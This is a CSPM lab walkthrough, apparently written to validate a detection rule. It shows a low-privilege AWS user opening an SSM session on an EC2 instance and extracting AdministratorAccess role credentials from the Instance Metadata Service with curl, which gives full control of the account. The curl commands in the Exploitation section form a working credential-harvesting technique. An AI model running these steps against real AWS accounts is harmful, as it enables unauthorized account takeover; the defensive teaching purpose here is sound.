# Guided Walkthrough: CSPM Misconfiguration — EC2 Instance with Highly Privileged IAM Role

This scenario validates the CSPM detection rule:

**`aws-ec2-instance-ec2-instance-should-not-have-a-highly-privileged-iam-role-attached-to-it`**

Anyone with access to the `pl-cspm-ec2-001-instance` EC2 instance can leverage the administrative IAM role attached to it. Access vectors include SSM Session Manager, SSH, vulnerability exploits, and supply chain attacks. Once on the instance, credentials are trivially extracted from the Instance Metadata Service (IMDS) at `169.254.169.254`, yielding full AWS account access.

This misconfiguration is common in environments where developers attach `AdministratorAccess` for convenience during initial setup and the permission is never scoped down. Detection difficulty is high because legitimate IMDS access is indistinguishable from malicious credential harvesting without additional controls.

## The Challenge

You start as the `pl-cspm-ec2-001-demo-user` IAM user. This user has a narrow permission set: it can start SSM sessions on the `pl-cspm-ec2-001-instance` EC2 instance, but it cannot call IAM APIs, list S3 buckets, or do anything else of consequence in the account.

Your goal is to obtain credentials for the `pl-cspm-ec2-001-admin-role` IAM role, which has `AdministratorAccess` attached. The role is not directly assumable by your user — but it is attached to the EC2 instance you can access.

## Reconnaissance

First, confirm who you are and what you can (and cannot) do:

```bash
aws sts get-caller-identity
# Returns: pl-cspm-ec2-001-demo-user

aws iam list-users --max-items 1
# Returns: AccessDenied — your user has no IAM permissions
```

Now check that the instance is available via SSM:

```bash
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=<INSTANCE_ID>" \
  --query 'InstanceInformationList[0].PingStatus' \
  --output text
# Returns: Online
```

## Exploitation

With the instance reachable over SSM, open an interactive session. From the demo user's perspective, this is a legitimate operation — `ssm:StartSession` is exactly what the user is permitted to do.

```bash
aws ssm start-session --region <REGION> --target <INSTANCE_ID>
```

You are now inside the instance as `ssm-user`. From here, the Instance Metadata Service is reachable at the link-local address `169.254.169.254` without any authentication.

First, obtain an IMDSv2 session token (good practice even if IMDSv2 is not enforced):

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
```

Next, retrieve the name of the IAM role attached to this instance:

```bash
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
echo "Attached role: $ROLE_NAME"
# Returns: pl-cspm-ec2-001-admin-role
```

Now extract the temporary credentials for that role:

```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null | jq .
```

The response contains `AccessKeyId`, `SecretAccessKey`, and `Token` — temporary credentials for `pl-cspm-ec2-001-admin-role`.

## Verification

Exit the SSM session and use the extracted credentials to verify administrative access:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>

aws sts get-caller-identity
# Returns: arn:aws:sts::<ACCOUNT>:assumed-role/pl-cspm-ec2-001-admin-role/...

aws iam list-users
# Returns: full list of IAM users — you now have AdministratorAccess
```

## What Happened

You started with a user that had only the right to open an SSM session on one EC2 instance. That turned out to be sufficient to gain full administrative control of the AWS account, because the instance had `AdministratorAccess` attached to it via an instance profile.

The IMDS is a feature, not a vulnerability — every EC2 instance exposes it by default. The misconfiguration is the combination of a highly privileged role and broad instance access. In a real environment this plays out through many vectors beyond SSM: a developer with SSH access, a vulnerable web application running on the instance, a malicious package pulled in via a build pipeline, or a compromised AMI. Any code execution on the instance is sufficient.

The CSPM finding (`aws-ec2-instance-ec2-instance-should-not-have-a-highly-privileged-iam-role-attached-to-it`) catches this statically — before any attacker arrives — by analyzing the relationship between the instance profile, the attached role, and the policies on that role. That is the value of CSPM: finding this class of misconfiguration at configuration time rather than in a post-incident review.
